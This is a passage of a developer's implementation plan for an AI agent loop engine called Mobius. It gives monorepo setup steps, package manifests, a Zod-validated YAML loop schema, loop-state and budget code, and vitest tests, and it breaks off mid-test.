# Mobius Agent Phase 1: 莫比乌斯之心 实现计划

> **For Claude:** Use `${SUPERPOWERS_SKILLS_ROOT}/skills/collaboration/executing-plans/SKILL.md` to implement this plan task-by-task.

**Goal:** 实现最小 Möbius Loop — 用户用自然语言描述目标（如 `mobius create "写一个 hello world 函数并写测试"`），Mobius 自动生成 Loop 定义，在 worktree 中真实写文件、执行命令、根据 conditions 验证结果、循环直到通过或 budget 耗尽，并将经验写入 Memory。Phase 1 结束时，用户不需要手写一行 YAML——一句话就够了。

**Architecture:** Phase 1 只做 TypeScript 单体 — Mobius Brain (Loop 引擎 + Eval + Memory + LoopGenerator + 简化 Guardrails) + OpenClaw 骨架 (Gateway/EventBus/Plugin)。Hermes Python 安全层推迟到 Phase 2。gRPC proto 保留作为 Phase 2 接口设计文档，不参与编译。

**Tech Stack:** TypeScript (Node.js 20+), SQLite (Memory 存储), YAML (Loop DSL), Git Worktree (执行隔离)

---

## 修正说明（基于意见01评审）

本计划已吸收 [意见01.md](./意见01.md) 的10条修正建议。采纳/调整/部分推迟的决策如下：

| 修正 | 内容 | 决策 |
|------|------|------|
| 1 | STAGNANT 终止状态 | ✅ 采纳 — P0 bug fix |
| 2 | 预算跟踪实现 | ✅ 采纳 — P0 bug fix |
| 3 | DSL conditions/boundaryConditions | ⚠️ 采纳但调整 — threshold 保留为 LLM 软性质量评分（非 1.0），conditions 做硬性验证，两者互补 |
| 4 | CommandBasedJudge | ⚠️ 采纳但重新设计 — 改为 CompositeJudge = CommandBasedJudge(硬性) + LLMJudge mock(软性) |
| 5 | LocalExecutor | ✅ 采纳 — write_file/read_file/run_command/list_dir/append_file |
| 6 | CLI 集成真实组件 | ✅ 采纳 — 跟随修正 4/5 |
| 7 | 砍掉 Hermes Python | ⚠️ 采纳但保留 proto 作为设计文档（不编译） |
| 8 | EventBus off() | ✅ 采纳 — P2 bug fix |
| 9 | Memory 知识过期 | ⚠️ 部分采纳 — status/superseded_by/expires_at 采纳，CLAUDE.md 导出推迟 Phase 2 |
| 10 | 测试预期更新 | ✅ 采纳 — 跟随修正 1/2 |

---

## 修正后 Task 清单

| Task | 内容 | 来源 |
|------|------|------|
| 1 | Monorepo 项目结构搭建 | 保留 |
| 2 | Proto 设计文档（仅文档，不编译） | 降级 |
| 3 | Loop DSL 解析器 (+conditions/boundaryConditions) | 修正 |
| 4 | Möbius Loop 引擎 (+STAGNANT, +真实budget) | 修正 |
| 4.5 | CompositeJudge (CommandBased + LLM mock) | **新增** |
| 4.6 | LocalExecutor (write_file/read_file/run_command/list_dir/append_file) | **新增** |
| 4.7 | LoopGenerator (自然语言 → YAML Loop 定义) | **新增** |
| 5 | Loop DSL 内部测试 fixture (不再用户手写) | 修正 |
| 6 | SQLite Memory Store (+status/superseded_by/expires_at) | 修正 |
| 6.5 | SimpleGuardrails (TS 简化版，替代 Phase 1 Python) | **新增** |
| 6.6 | LoopRegistry (Loop 注册/查询/存储) | **新增** |
| 7 | Gateway EventBus + PluginManager (+off()实现) | 修正 |
| 8 | CLI (mobius create/run/list/status/logs/stop/edit) | **重写** |
| 9 | 端到端验收 (一句话自然语言 → 真实代码 → 跑通) | 修正 |

---

## 项目初始化

### Task 1: Monorepo 项目结构搭建

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `pnpm-workspace.yaml`
- Create: `packages/core/package.json`
- Create: `packages/gateway/package.json`
- Create: `packages/cli/package.json`
- Create: `packages/guardrails-py/pyproject.toml` (Phase 2 占位，无实现代码)
- Create: `.gitignore`

**Step 1: 创建根 package.json**

```bash
mkdir -p /Users/apple/vscodeproject/mobius-agent/packages/{core,gateway,cli,guardrails-py}
cd /Users/apple/vscodeproject/mobius-agent
```

Create `package.json`:

```json
{
  "name": "mobius-agent",
  "version": "0.1.0",
  "private": true,
  "description": "Next-gen Loop Engineering AI Agent — built on OpenClaw & Hermes shoulders",
  "scripts": {
    "dev": "pnpm --filter @mobius/cli dev",
    "build": "pnpm -r build",
    "test": "pnpm -r test",
    "lint": "pnpm -r lint"
  }
}
```

**Step 2: 创建 pnpm workspace**

Create `pnpm-workspace.yaml`:

```yaml
packages:
  - "packages/*"
```

**Step 3: 创建 tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "lib": ["ES2022"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true
  },
  "exclude": ["node_modules", "dist", "**/*.test.ts"]
}
```

**Step 4: 创建各子包 package.json**

Create `packages/core/package.json`:

```json
{
  "name": "@mobius/core",
  "version": "0.1.0",
  "private": true,
  "main": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "scripts": {
    "dev": "tsx watch src/index.ts",
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest",
    "lint": "eslint src/"
  },
  "dependencies": {
    "better-sqlite3": "^11.0.0",
    "js-yaml": "^4.1.0",
    "pino": "^9.0.0",
    "zod": "^3.23.0"
  },
  "devDependencies": {
    "@types/better-sqlite3": "^7.6.0",
    "@types/js-yaml": "^4.0.0",
    "@types/node": "^20.0.0",
    "eslint": "^9.0.0",
    "tsx": "^4.0.0",
    "typescript": "^5.4.0",
    "vitest": "^1.0.0"
  }
}
```

Create `packages/gateway/package.json`:

```json
{
  "name": "@mobius/gateway",
  "version": "0.1.0",
  "private": true,
  "main": "./dist/index.js",
  "scripts": {
    "build": "tsc",
    "test": "vitest run"
  },
  "dependencies": {
    "@mobius/core": "workspace:*"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "vitest": "^1.0.0"
  }
}
```

Create `packages/cli/package.json`:

```json
{
  "name": "@mobius/cli",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "bin": {
    "mobius": "./dist/index.js"
  },
  "scripts": {
    "build": "tsc",
    "dev": "tsx src/index.ts"
  },
  "dependencies": {
    "@mobius/core": "workspace:*",
    "@mobius/gateway": "workspace:*",
    "commander": "^12.0.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "tsx": "^4.0.0",
    "typescript": "^5.4.0"
  }
}
```

Create `packages/guardrails-py/pyproject.toml` (Phase 2 占位):

```toml
[project]
name = "mobius-guardrails"
version = "0.1.0"
description = "Mobius Agent security guardrails (Python) — Phase 2"
requires-python = ">=3.12"

# Phase 1: 仅占位，无实现代码。
# Phase 2: 实现 Hermes 风格 Tool Guardrails + Injection Scan + Budget Control。
# Phase 2 将通过 gRPC (proto/mobius/v1/guardrails.proto) 与 TypeScript 核心通信。
```

**Step 5: 安装依赖**

```bash
cd /Users/apple/vscodeproject/mobius-agent
pnpm install
```

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: initialize monorepo structure for mobius-agent (revised)

Phase 1 修正版:
- packages/core: Möbius Brain (Loop, Eval, Memory, Guardrails)
- packages/gateway: OpenClaw-inspired Gateway & Plugin system
- packages/cli: CLI entry point
- packages/guardrails-py: Phase 2 placeholder only (no code)

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Proto 设计文档

### Task 2: Proto 接口设计文档（仅文档，不编译不生成代码）

**Files:**
- Create: `docs/design/guardrails-proto.md`
- Create: `docs/design/loop-proto.md`

> **设计决策:** gRPC proto 作为 Phase 2 TypeScript ↔ Python 的接口契约文档保留，但不安装 protoc、不生成代码、不参与 Phase 1 构建。YAGNI——Phase 1 没有 Python 调用方。

**Step 1: 创建 Guardrails 接口设计文档**

Create `docs/design/guardrails-proto.md`:

```markdown
# Guardrails Service — Phase 2 接口设计

Phase 2 将用 Python 独立进程实现 Hermes 风格的 Tool Guardrails。
以下为预定义的 gRPC 接口契约。

## Service: GuardrailsService

### CheckToolCall
- Request: agent_id, tool_name, tool_params_json, iteration_count
- Response: decision (ALLOW/DENY/WARN/REQUIRE_HUMAN), reason, warnings[]

### ScanContext
- Request: agent_id, context_text
- Response: safe (bool), threats_found[]

### ReportExecution
- Request: agent_id, tool_name, result_summary, duration_ms
- Response: anomaly_detected (bool), anomaly_description

Phase 1 等价实现: `packages/core/src/guardrails/simple-guardrails.ts`
```

**Step 2: 创建 Loop 接口设计文档**

Create `docs/design/loop-proto.md`:

```markdown
# Loop Service — Phase 2 接口设计

Phase 2 支持 gRPC 远程触发 Loop 执行，供多通道 (Slack/飞书/HTTP) 调用。

## Service: LoopService

### RunLoop
- Request: loop_definition_yaml, task_context
- Response: session_id

### GetLoopStatus
- Request: session_id
- Response: phase, iteration, last_eval_score

### InterruptLoop
- Request: session_id
- Response: success

Phase 1 等价实现: CLI `mobius run <loop.yaml>`
```

**Step 3: Commit**

```bash
git add docs/design/
git commit -m "docs: add gRPC interface design docs for Phase 2 guardrails and loop services"
```

---

## Loop DSL

### Task 3: Loop DSL 解析器 (+conditions/boundaryConditions)

**Files:**
- Create: `packages/core/src/loop/loop-definition.ts`
- Create: `packages/core/src/loop/loop-parser.ts`
- Create: `packages/core/src/loop/__tests__/loop-parser.test.ts`

**Step 1: 用 Zod 写完整 Loop Definition Schema**

Create `packages/core/src/loop/loop-definition.ts`:

```typescript
import { z } from "zod";

// ---- Trigger ----

export const CronTriggerSchema = z.object({
  type: z.literal("cron"),
  cronExpression: z.string(),
});

export const EventTriggerSchema = z.object({
  type: z.literal("event"),
  eventType: z.string(),
  filter: z.string().optional(),
});

export const ManualTriggerSchema = z.object({
  type: z.literal("manual"),
  commandName: z.string(),
});

export const TriggerSchema = z.discriminatedUnion("type", [
  CronTriggerSchema,
  EventTriggerSchema,
  ManualTriggerSchema,
]);

// ---- Execution ----

export const ExecutionConfigSchema = z.object({
  maxIterations: z.number().int().positive().default(100),
  maxTokensPerIter: z.number().int().positive().default(50000),
  timeoutSeconds: z.number().int().positive().default(3600),
  useWorktree: z.boolean().default(true),
  worktreeMode: z.enum(["fresh", "head"]).default("fresh"),
});

// ---- Eval Conditions (修正3: 新增可验证的完成条件) ----

export const EvalConditionSchema = z.discriminatedUnion("type", [
  z.object({
    type: z.literal("command_exit_code"),
    command: z.string(),
    expected: z.number().int().default(0),
    description: z.string(),
  }),
  z.object({
    type: z.literal("command_output_contains"),
    command: z.string(),
    expected: z.string(),
    description: z.string(),
  }),
  z.object({
    type: z.literal("file_exists"),
    path: z.string(),
    description: z.string(),
  }),
  z.object({
    type: z.literal("file_not_empty"),
    path: z.string(),
    description: z.string(),
  }),
  z.object({
    type: z.literal("custom"),
    script: z.string(),
    description: z.string(),
  }),
]);

export type EvalCondition = z.infer<typeof EvalConditionSchema>;

// ---- Boundary Conditions (修正3: 古德哈特定律防护) ----

export const BoundaryConditionSchema = z.discriminatedUnion("type", [
  z.object({
    type: z.literal("file_count_min"),
    path: z.string(),
    min: z.number().int(),
    description: z.string(),
  }),
  z.object({
    type: z.literal("no_file_deleted"),
    path: z.string(),
    description: z.string(),
  }),
  z.object({
    type: z.literal("command_forbidden"),
    forbiddenPattern: z.string(),
    description: z.string(),
  }),
]);

export type BoundaryCondition = z.infer<typeof BoundaryConditionSchema>;

// ---- Eval Config (修正3: threshold 保留为 LLM 软性质量评分) ----

export const EvalConfigSchema = z.object({
  judgeModel: z.string().default("claude-sonnet-4-6"),
  threshold: z.number().min(0).max(1).default(0.7),
    // ↑ LLM质量评分阈值(软性)。conditions 做硬性验证(全过才算完成)。
    //    两个维度互补：conditions=硬性binary验证，threshold=软性质量评估。
  maxRetries: z.number().int().positive().default(3),
  stagnantRounds: z.number().int().positive().default(3),
  conditions: z.array(EvalConditionSchema).default([]),
  boundaryConditions: z.array(BoundaryConditionSchema).default([]),
});

// ---- Delegation (Phase 2) ----

export const DelegationConfigSchema = z.object({
  maxDepth: z.number().int().min(0).max(10).default(0),
  maxSubagents: z.number().int().positive().default(10),
  budgetPerNode: z.number().int().positive().default(100000),
});

// ---- Memory ----

export const MemoryConfigSchema = z.object({
  autoNudge: z.boolean().default(true),
  autoSkillCreation: z.boolean().default(false),
  claudeMdMaxLines: z.number().int().positive().default(200),
});

// ---- Failure ----

export const FailureConfigSchema = z.object({
  strategy: z
    .enum(["retry", "escalate_to_human", "graceful_degrade", "abort"])
    .default("retry"),
  maxRetries: z.number().int().positive().default(3),
  escalationChannel: z.string().optional(),
});

// ---- Loop Definition ----

export const LoopDefinitionSchema = z.object({
  id: z.string(),
  name: z.string(),
  description: z.string().optional(),
  trigger: TriggerSchema,
  execution: ExecutionConfigSchema.default({}),
  eval: EvalConfigSchema.default({}),
  skills: z.array(z.string()).default([]),
  mcpConnectors: z.array(z.string()).default([]),
  delegation: DelegationConfigSchema.default({}),
  memory: MemoryConfigSchema.default({}),
  onFailure: FailureConfigSchema.default({}),
});

export type LoopDefinition = z.infer<typeof LoopDefinitionSchema>;
export type Trigger = z.infer<typeof TriggerSchema>;
export type EvalConfig = z.infer<typeof EvalConfigSchema>;
export type FailureConfig = z.infer<typeof FailureConfigSchema>;
```

**Step 2: 写 YAML 解析器**

Create `packages/core/src/loop/loop-parser.ts`:

```typescript
import * as yaml from "js-yaml";
import { readFileSync } from "fs";
import { LoopDefinitionSchema, LoopDefinition } from "./loop-definition.js";

export function parseLoopDefinition(yamlContent: string): LoopDefinition {
  const raw = yaml.load(yamlContent);
  if (!raw || typeof raw !== "object") {
    throw new Error("Invalid YAML: expected a mapping at the top level");
  }
  return LoopDefinitionSchema.parse(raw);
}

export function loadLoopDefinition(filePath: string): LoopDefinition {
  const content = readFileSync(filePath, "utf-8");
  return parseLoopDefinition(content);
}

export function serializeLoopDefinition(loop: LoopDefinition): string {
  return yaml.dump(LoopDefinitionSchema.parse(loop));
}
```

**Step 3: 写测试**

Create `packages/core/src/loop/__tests__/loop-parser.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { parseLoopDefinition, loadLoopDefinition } from "../loop-parser.js";
import { resolve } from "path";

const MINIMAL_LOOP_YAML = `
id: test-loop-1
name: Test Loop
trigger:
  type: manual
  commandName: test-loop
`;

const FULL_LOOP_YAML = `
id: hello-world-loop
name: Hello World TDD Loop
description: Write code, run tests, fix bugs, loop until pass.
trigger:
  type: manual
  commandName: hello-loop
execution:
  maxIterations: 10
  maxTokensPerIter: 20000
  timeoutSeconds: 600
  useWorktree: true
  worktreeMode: fresh
eval:
  judgeModel: claude-sonnet-4-6
  threshold: 0.7
  maxRetries: 5
  stagnantRounds: 3
  conditions:
    - type: command_exit_code
      command: npm test
      expected: 0
      description: 所有测试通过
    - type: command_exit_code
      command: npm run lint
      expected: 0
      description: Lint零报错
  boundaryConditions:
    - type: no_file_deleted
      path: "."
      description: 不能删除已有源文件
    - type: file_count_min
      path: src/__tests__
      min: 1
      description: 至少保留1个测试文件
skills:
  - test-driven-development
  - systematic-debugging
delegation:
  maxDepth: 0
memory:
  autoNudge: true
  claudeMdMaxLines: 200
onFailure:
  strategy: escalate_to_human
  maxRetries: 3
`;

describe("parseLoopDefinition", () => {
  it("parses a minimal loop definition with defaults", () => {
    const loop = parseLoopDefinition(MINIMAL_LOOP_YAML);
    expect(loop.id).toBe("test-loop-1");
    expect(loop.name).toBe("Test Loop");
    expect(loop.trigger.type).toBe("manual");
    if (loop.trigger.type === "manual") {
      expect(loop.trigger.commandName).toBe("test-loop");
    }
    expect(loop.execution.maxIterations).toBe(100);
    expect(loop.eval.threshold).toBe(0.7);
    expect(loop.eval.conditions).toHaveLength(0);
    expect(loop.eval.boundaryConditions).toHaveLength(0);
  });

  it("parses eval conditions and boundary conditions", () => {
    const loop = parseLoopDefinition(FULL_LOOP_YAML);
    expect(loop.eval.conditions).toHaveLength(2);
    expect(loop.eval.conditions[0].type).toBe("command_exit_code");
    expect(loop.eval.boundaryConditions).toHaveLength(2);
    expect(loop.eval.boundaryConditions[0].type).toBe("no_file_deleted");
    expect(loop.eval.threshold).toBe(0.7);
    expect(loop.skills).toContain("test-driven-development");
  });

  it("throws on missing required field (name)", () => {
    const badYaml = `id: missing-name\ntrigger:\n  type: manual\n  commandName: test`;
    expect(() => parseLoopDefinition(badYaml)).toThrow();
  });

  it("throws on invalid condition type", () => {
    const badYaml = `
id: bad
name: Bad
trigger:
  type: manual
  commandName: test
eval:
  conditions:
    - type: unknown_type
      description: bad
`;
    expect(() => parseLoopDefinition(badYaml)).toThrow();
  });

  it("loads hello-world loop from disk", () => {
    // Will verify in Task 5 after YAML file created
    // Placeholder for now
  });
});
```

**Step 4: 运行测试**

```bash
cd packages/core
pnpm test -- --run
```

Expected: 4 tests PASS (5th is placeholder for Task 5)

**Step 5: Commit**

```bash
git add packages/core/src/loop/
git commit -m "feat(core): implement Loop DSL parser with conditions and boundary conditions

- LoopDefinitionSchema with Zod validation
- EvalConditionSchema: command_exit_code, command_output_contains, file_exists, file_not_empty, custom
- BoundaryConditionSchema: file_count_min, no_file_deleted, command_forbidden
- threshold retained as LLM soft quality metric (0.7 default), conditions as hard binary checks
- YAML parser with parse/load/serialize

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Loop 核心引擎

### Task 4: Möbius Loop 引擎 (+STAGNANT, +真实budget)

**Files:**
- Create: `packages/core/src/loop/loop-state.ts`
- Create: `packages/core/src/loop/loop-engine.ts`
- Create: `packages/core/src/loop/__tests__/loop-engine.test.ts`

**Step 1: 定义 Loop 状态 (修正1 & 修正2)**

Create `packages/core/src/loop/loop-state.ts`:

```typescript
export enum LoopPhase {
  IDLE = "idle",
  PREPARING = "preparing",
  EXECUTING = "executing",
  EVALUATING = "evaluating",
  REFLECTING = "reflecting",
  DECIDING = "deciding",
  COMPLETED = "completed",
  FAILED = "failed",
  STAGNANT = "stagnant",       // 修正1: 新增，连续多轮无进展
  INTERRUPTED = "interrupted",
}

export function isTerminalPhase(phase: LoopPhase): boolean {
  return [
    LoopPhase.COMPLETED,
    LoopPhase.FAILED,
    LoopPhase.STAGNANT,        // 修正1: 入terminal集合
    LoopPhase.INTERRUPTED,
  ].includes(phase);
}

// 修正2: 有状态预算跟踪
export interface LoopBudget {
  maxIterations: number;
  maxTokens: number;
  timeoutSeconds: number;
  iterationsUsed: number;
  tokensUsed: number;
  startTime: number;
  consumeIteration(tokensThisIter: number): void;
  remaining(): { iterations: number; tokens: number; timeoutMs: number };
  isExhausted(): boolean;
}

export function createLoopBudget(
  maxIterations: number,
  maxTokens: number,
  timeoutSeconds: number
): LoopBudget {
  return {
    maxIterations,
    maxTokens,
    timeoutSeconds,
    iterationsUsed: 0,
    tokensUsed: 0,
    startTime: Date.now(),
    consumeIteration(tokensThisIter: number) {
      this.iterationsUsed++;
      this.tokensUsed += tokensThisIter;
    },
    remaining() {
      const elapsedMs = Date.now() - this.startTime;
      return {
        iterations: Math.max(0, this.maxIterations - this.iterationsUsed),
        tokens: Math.max(0, this.maxTokens - this.tokensUsed),
        timeoutMs: Math.max(0, this.timeoutSeconds * 1000 - elapsedMs),
      };
    },
    isExhausted() {
      const r = this.remaining();
      return r.iterations <= 0 || r.tokens <= 0 || r.timeoutMs <= 0;
    },
  };
}

export interface LoopState {
  loopId: string;
  phase: LoopPhase;
  iteration: number;
  startTime: Date;
  lastIterationTime: Date | null;
  totalTokensUsed: number;
  totalDurationMs: number;
  lastEvalScore: number | null;
  evalScoreHistory: number[];
  stagnantRoundsCount: number;
  budget: LoopBudget;
  artifacts: Array<{
    type: string;
    path: string;
    description: string;
  }>;
}

export function createLoopState(
  loopId: string,
  maxIterations: number,
  maxTokens: number,
  timeoutSeconds: number
): LoopState {
  return {
    loopId,
    phase: LoopPhase.IDLE,
    iteration: 0,
    startTime: new Date(),
    lastIterationTime: null,
    totalTokensUsed: 0,
    totalDurationMs: 0,
    lastEvalScore: null,
    evalScoreHistory: [],
    stagnantRoundsCount: 0,
    budget: createLoopBudget(maxIterations, maxTokens, timeoutSeconds),
    artifacts: [],
  };
}

export function transition(state: LoopState, to: LoopPhase): LoopState {
  if (isTerminalPhase(state.phase)) {
    throw new Error(
      `Cannot transition from terminal phase '${state.phase}' to '${to}'`
    );
  }
  return { ...state, phase: to, lastIterationTime: new Date() };
}
```

**Step 2: 实现 Loop 引擎 (修正1 & 修正2)**

Create `packages/core/src/loop/loop-engine.ts`:

```typescript
import { LoopDefinition } from "./loop-definition.js";
import {
  LoopState,
  LoopPhase,
  createLoopState,
  transition,
  isTerminalPhase,
} from "./loop-state.js";

export interface ToolExecutor {
  execute(toolName: string, params: Record<string, unknown>): Promise<ToolResult>;
}

export interface ToolResult {
  success: boolean;
  output: string;
  error?: string;
  artifacts?: Array<{ type: string; path: string; description: string }>;
}

export interface EvalJudge {
  evaluate(state: LoopState, taskOutput: string): Promise<EvalResult>;
}

export interface EvalResult {
  score: number;        // 0.0 - 1.0 (CompositeJudge合并硬性+软性)
  reasoning: string;
  suggestions: string[];
  isStagnant: boolean;
  allConditionsPassed: boolean;  // 修正3: hard conditions全部通过?
  boundaryViolations: string[];  // 修正3: 边界违规列表
}

export interface MemoryWriter {
  writeNudge(entry: MemoryEntry): Promise<void>;
  summarizeSession(sessionId: string): Promise<string>;
}

export interface MemoryEntry {
  type: "fact" | "pattern" | "error" | "skill_suggestion";
  content: string;
  confidence: number;
  source: string;
  timestamp: Date;
}

export interface LoopEngineConfig {
  definition: LoopDefinition;
  toolExecutor: ToolExecutor;
  evalJudge: EvalJudge;
  memoryWriter: MemoryWriter;
  onPhaseChange?: (state: LoopState) => void;
  onError?: (error: Error, state: LoopState) => void;
}

export class LoopEngine {
  private config: LoopEngineConfig;
  private state: LoopState;
  private abortController: AbortController | null = null;

  constructor(config: LoopEngineConfig) {
    this.config = config;
    const def = config.definition;
    this.state = createLoopState(
      def.id,
      def.execution.maxIterations,
      def.execution.maxTokensPerIter * def.execution.maxIterations,
      def.execution.timeoutSeconds
    );
  }

  getState(): Readonly<LoopState> {
    return this.state;
  }

  async run(taskContext: string): Promise<LoopState> {
    this.abortController = new AbortController();
    this.state = transition(this.state, LoopPhase.PREPARING);
    this.emitPhaseChange();

    try {
      while (!isTerminalPhase(this.state.phase)) {
        // 修正2: 真实预算检查
        if (this.state.budget.isExhausted()) {
          this.state = { ...this.state, phase: LoopPhase.FAILED };
          break;
        }

        this.state.iteration++;
        this.state = transition(this.state, LoopPhase.EXECUTING);
        this.emitPhaseChange();

        const taskOutput = await this.executePhase(taskContext);
        // 修正2: 消费预算
        this.state.budget.consumeIteration(5000); // TODO Phase 2: 从API获取真实token数
        this.state.totalTokensUsed = this.state.budget.tokensUsed;

        this.state = transition(this.state, LoopPhase.EVALUATING);
        this.emitPhaseChange();

        const evalResult = await this.config.evalJudge.evaluate(
          this.state,
          taskOutput
        );
        this.state.lastEvalScore = evalResult.score;
        this.state.evalScoreHistory.push(evalResult.score);

        if (evalResult.isStagnant) {
          this.state.stagnantRoundsCount++;
        } else {
          this.state.stagnantRoundsCount = 0;
        }

        this.state = transition(this.state, LoopPhase.REFLECTING);
        this.emitPhaseChange();
        await this.reflectPhase(evalResult, taskOutput);

        this.state = transition(this.state, LoopPhase.DECIDING);
        this.emitPhaseChange();

        const def = this.config.definition;

        // 修正3: 完成条件 = hard conditions全部通过 AND soft score >= threshold
        if (evalResult.allConditionsPassed && evalResult.score >= def.eval.threshold) {
          this.state = { ...this.state, phase: LoopPhase.COMPLETED };
        } else if (this.state.stagnantRoundsCount >= def.eval.stagnantRounds) {
          // 修正1: STAGNANT 而非 COMPLETED
          this.state = { ...this.state, phase: LoopPhase.STAGNANT };
        } else if (this.state.budget.isExhausted()) {
          this.state = { ...this.state, phase: LoopPhase.FAILED };
        }
        // else: continue loop
      }

      return this.state;
    } catch (error) {
      this.state = { ...this.state, phase: LoopPhase.FAILED };
      this.config.onError?.(error as Error, this.state);
      return this.state;
    }
  }

  interrupt(): void {
    this.abortController?.abort();
    this.state = { ...this.state, phase: LoopPhase.INTERRUPTED };
  }

  private async executePhase(taskContext: string): Promise<string> {
    const result = await this.config.toolExecutor.execute("run_task", {
      context: taskContext,
      skills: this.config.definition.skills,
      iteration: this.state.iteration,
    });
    if (result.artifacts) {
      this.state.artifacts.push(...result.artifacts);
    }
    return result.output;
  }

  private async reflectPhase(
    evalResult: EvalResult,
    taskOutput: string
  ): Promise<void> {
    if (!this.config.definition.memory.autoNudge) return;

    await this.config.memoryWriter.writeNudge({
      type: "fact",
      content: `Iter ${this.state.iteration}: score=${evalResult.score.toFixed(2)}, conditions=${evalResult.allConditionsPassed ? "ALL" : "SOME_FAILED"}`,
      confidence: 0.9,
      source: `loop:${this.state.loopId}`,
      timestamp: new Date(),
    });

    if (evalResult.suggestions.length > 0) {
      await this.config.memoryWriter.writeNudge({
        type: "pattern",
        content: evalResult.suggestions.join("; "),
        confidence: 0.7,
        source: `loop:${this.state.loopId}:eval`,
        timestamp: new Date(),
      });
    }

    if (evalResult.score < 0.3) {
      await this.config.memoryWriter.writeNudge({
        type: "error",
        content: `Low score ${evalResult.score.toFixed(2)}: ${taskOutput.slice(0, 500)}`,
        confidence: 0.8,
        source: `loop:${this.state.loopId}:error`,
        timestamp: new Date(),
      });
    }
  }

  private emitPhaseChange(): void {
    this.config.onPhaseChange?.(this.state);
  }
}
```

**Step 3: 写测试**

Create `packages/core/src/loop/__tests__/loop-engine.test.ts`:

```typescript
import { describe, it, expect, vi } from "vitest";
import { LoopEngine, LoopEngineConfig } from "../loop-engine.js";
import { LoopDefinition } from "../loop-definition.js";
import { LoopPhase } from "../loop-state.js";

function mockConfig(overrides?: Partial<LoopDefinition>): LoopEngineConfig {
  const definition: LoopDefinition = {
    id: "test-loop",
    name: "Test Loop",
    trigger: { type: "manual", commandName: "test" },
    execution: { maxIterations: 3, maxTokensPerIter: 1000, timeoutSeconds: 60, useWorktree: false, worktreeMode: "fresh" },
    eval: { judgeModel: "test", threshold: 0.7, maxRetries: 2, stagnantRounds: 2, conditions: [], boundaryConditions: [] },
    delegation: { maxDepth: 0, maxSubagents: 0, budgetPerNode: 0 },
    memory: { autoNudge: true, autoSkillCreation: false, claudeMdMaxLines: 200 },
    onFailure: { strategy: "retry", maxRetries: 2 },
    skills: [],
    mcpConnectors: [],
    ...overrides,
  };

  return {
    definition,
    toolExecutor: {
      execute: vi.fn().mockResolvedValue({
        success: true,
        output: "code written and tested",
        artifacts: [{ type: "file", path: "src/index.ts", description: "source" }],
      }),
    },
    evalJudge: {
      evaluate: vi.fn(),
    },
    memoryWriter: {
      writeNudge: vi.fn().mockResolvedValue(undefined),
      summarizeSession: vi.fn().mockResolvedValue("summary"),
    },
  };
}

describe("LoopEngine", () => {
  it("completes when all conditions passed and score >= threshold", async () => {
    const config = mockConfig();
    (config.evalJudge.evaluate as ReturnType<typeof vi.fn>).mockResolvedValue({
      score: 0.85,
      reasoning: "All good",
      suggestions: [],
      isStagnant: false,
      allConditionsPassed: true,
      boundaryViolations: [],
    });

    const engine = new LoopEngine(config);
    const result = await engine.run("Write hello world");

    expect(result.phase).toBe(LoopPhase.COMPLETED);
    expect(result.iteration).toBe(1);
  });

  it("continues when conditions not all passed even if score high", async () => {
    const config = mockConfig({
      eval: { judgeModel: "test", threshold: 0.7, maxRetries: 3, stagnantRounds: 5, conditions: [], boundaryConditions: [] },
    });
    const evaluate = config.evalJudge.evaluate as ReturnType<typeof vi.fn>;
    evaluate
      .mockResolvedValueOnce({
        score: 0.9, reasoning: "Code looks good but tests fail",
        suggestions: ["Fix tests"], isStagnant: false,
        allConditionsPassed: false, boundaryViolations: [],
      })
      .mockResolvedValueOnce({
        score: 0.9, reasoning: "Tests pass now",
        suggestions: [], isStagnant: false,
        allConditionsPassed: true, boundaryViolations: [],
      });

    const engine = new LoopEngine(config);
    const result = await engine.run("Write hello world");

    expect(result.phase).toBe(LoopPhase.COMPLETED);
    expect(result.iteration).toBe(2);
  });

  // 修正1: stagnant → STAGNANT
  it("terminates with STAGNANT when rounds exceed threshold", async () => {
    const config = mockConfig({
      eval: { judgeModel: "test", threshold: 0.99, maxRetries: 10, stagnantRounds: 2, conditions: [], boundaryConditions: [] },
    });
    const evaluate = config.evalJudge.evaluate as ReturnType<typeof vi.fn>;
    evaluate.mockResolvedValue({
      score: 0.3, reasoning: "Still failing", suggestions: [],
      isStagnant: true, allConditionsPassed: false, boundaryViolations: [],
    });

    const engine = new LoopEngine(config);
    const result = await engine.run("Impossible task");

    // 修正1: 应该是 STAGNANT 而不是 COMPLETED
    expect(result.phase).toBe(LoopPhase.STAGNANT);
    expect(result.stagnantRoundsCount).toBeGreaterThanOrEqual(2);
  });

  // 修正2: budget 耗尽测试
  it("terminates with FAILED when budget exhausted", async () => {
    const config = mockConfig({
      execution: { maxIterations: 1, maxTokensPerIter: 1000, timeoutSeconds: 60, useWorktree: false, worktreeMode: "fresh" },
      eval: { judgeModel: "test", threshold: 0.99, maxRetries: 10, stagnantRounds: 10, conditions: [], boundaryConditions: [] },
    });
    const evaluate = config.evalJudge.evaluate as ReturnType<typeof vi.fn>;
    evaluate.mockResolvedValue({
      score: 0.1, reasoning: "Fail", suggestions: [],
      isStagnant: false, allConditionsPassed: false, boundaryViolations: [],
    });

    const engine = new LoopEngine(config);
    const result = await engine.run("Will exhaust budget");
    expect(result.phase).toBe(LoopPhase.FAILED);
    expect(result.budget.iterationsUsed).toBeGreaterThanOrEqual(1);
  });

  it("writes memory nudge after each iteration", async () => {
    const config = mockConfig();
    const evaluate = config.evalJudge.evaluate as ReturnType<typeof vi.fn>;
    evaluate
      .mockResolvedValueOnce({ score: 0.5, reasoning: "OK", suggestions: ["Improve"], isStagnant: false, allConditionsPassed: false, boundaryViolations: [] })
      .mockResolvedValueOnce({ score: 0.9, reasoning: "Good", suggestions: [], isStagnant: false, allConditionsPassed: true, boundaryViolations: [] });

    const engine = new LoopEngine(config);
    await engine.run("A task");
